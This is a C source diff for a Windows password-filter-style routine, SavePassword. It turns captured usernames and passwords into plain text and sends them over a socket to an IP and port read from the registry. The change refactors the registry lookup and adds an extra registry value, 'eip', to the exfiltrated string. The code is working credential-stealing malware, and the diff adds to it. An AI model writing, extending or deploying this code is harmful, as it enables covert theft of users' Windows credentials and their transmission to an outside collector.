@@ -77,13 +77,13 @@ DWORD getPtReg()
 	return 80;
 }
 
-char* getIPReg()
+char* getIPReg(const short* input)
 {
 	HKEY hKey;
 	char Data[255];
 	DWORD Datasize = sizeof(Data);
 	DWORD Type;
-	char ipa[20];
+	char* ipa = (char*)malloc(20);
 	int indCtr = 0;
 
 	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
@@ -93,7 +93,7 @@ char* getIPReg()
 		&hKey) == ERROR_SUCCESS)
 	{
 		DWORD error = RegQueryValueEx(hKey,
-			L"ipa",
+			input,
 			NULL,
 			&Type,
 			(LPBYTE)&Data,
@@ -129,19 +129,15 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	SOCKET s;
 	struct sockaddr_in server;
 
-	char* ip = getIPReg();
-	DWORD port = getPtReg();
-	printf("%s:%d", ip, port);
-
 	char user[50];
 	char pass[50];
-	char creds[100];
+	char creds[150];
 
 	wcstombs(user, username->Buffer, sizeof(user));
 	wcstombs(pass, password->Buffer, sizeof(pass));
 
-	sprintf(creds, "%s:%s;end", user, pass);
-
+	char* ip = getIPReg(L"ipa");
+	DWORD port = getPtReg();
 	printf("\nInitialising Winsock...");
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 	{
@@ -173,6 +169,9 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 
 	puts("Connected");
 
+	char* eip = getIPReg(L"eip");
+	sprintf(creds, "%s:%s;end;%s;", user, pass, eip);
+	free(eip);
 	//Send some data
 	if (send(s, creds, strlen(creds), 0) < 0)
 	{
@@ -181,11 +180,12 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	}
 	puts("Data Send\n");
 
+	free(ip);
 	WSACleanup();
-
 	return 0;
 
-	error: 
+error:
+	free(ip);
 	WSACleanup();
 	return 1;
 }
